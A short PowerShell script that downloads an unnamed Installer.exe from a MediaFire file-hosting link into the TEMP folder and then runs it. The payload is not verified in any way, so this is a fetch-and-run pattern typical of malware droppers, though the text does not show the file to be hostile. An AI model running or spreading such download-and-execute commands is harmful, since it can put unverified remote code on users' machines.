$url = "
https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
$output = "$env:TEMP\Installer.exe"

Write-Host "Downloading software installer..."
Invoke-WebRequest -Uri $url -OutFile $output

Write-Host "Starting installer (requires user confirmation)..."
Start-Process -FilePath $output -Wait
